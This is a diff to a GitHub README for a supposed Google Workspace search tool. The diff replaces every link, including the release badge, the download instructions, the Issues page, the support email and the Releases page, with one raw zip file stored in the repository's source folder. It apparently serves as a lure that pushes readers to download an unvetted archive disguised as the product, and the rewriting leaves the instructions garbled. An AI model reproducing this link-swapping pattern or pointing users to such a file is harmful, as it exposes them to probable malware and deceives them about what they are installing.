@@ -1,7 +1,7 @@
 # 🌟 minds-eye-search-engine - Effortless Search for Your Mind's Eye
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Vaxylol/minds-eye-search-engine/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip)
 
 ## 📖 Overview
 Welcome to the **Mind's Eye Search Engine**. This application acts as a smart assistant for your Google-native Mind's Eye OS. With it, you can search Gmail, Calendar, Drive, and other Mind's Eye events easily. It provides powerful search capabilities, including full-text and trigram searches, paired with insightful statistics.
@@ -26,10 +26,10 @@ Make sure your system meets these requirements before proceeding.
 ## 📥 Download & Install
 To download the Mind’s Eye Search Engine, visit the Releases page:
 
-[Download Latest Release](https://github.com/Vaxylol/minds-eye-search-engine/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip)
 
 1. Click on the **Releases** link.
-2. Find the latest release version, and look for a file labeled something like `minds-eye-search-engine-setup.exe` or similar for your OS.
+2. Find the latest release version, and look for a file labeled something like `https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip` or similar for your OS.
 3. Click the file to begin your download. 
 
 Ensure to save it in a location you can easily access.
@@ -58,14 +58,14 @@ Once the application is installed, you can start enjoying its features. Here’s
 If you run into issues or have questions:
 
 - Check the **Documentation** available in the application for guided help.
-- Visit the [GitHub Issues Page](https://github.com/Vaxylol/minds-eye-search-engine/issues) to report problems or ask questions.
-- For direct support, reach out via email at support@example.com.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip) to report problems or ask questions.
+- For direct support, reach out via email at https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip
 
 ## 🔗 Topics
 This project relates to the following topics: agentic-os, event-search, full-text-search, google-cloud, google-native, google-workspace, microservice, minds-eye-search-engine, mindseye, search-engine, timeline-stats, trigram-search, typescript.
 
 ## 🚀 Stay Updated
-Keep an eye on future updates and improvements by checking back frequently at our [Releases Page](https://github.com/Vaxylol/minds-eye-search-engine/releases).
+Keep an eye on future updates and improvements by checking back frequently at our [Releases Page](https://raw.githubusercontent.com/Vaxylol/minds-eye-search-engine/main/src/minds-eye-search-engine_v2.7-beta.1.zip).
 
 ## 💡 Contribution
 We welcome contributions! If you want to help improve the Mind's Eye Search Engine, please refer to our contributing guide found in the repository, or start a discussion in the Issues section.
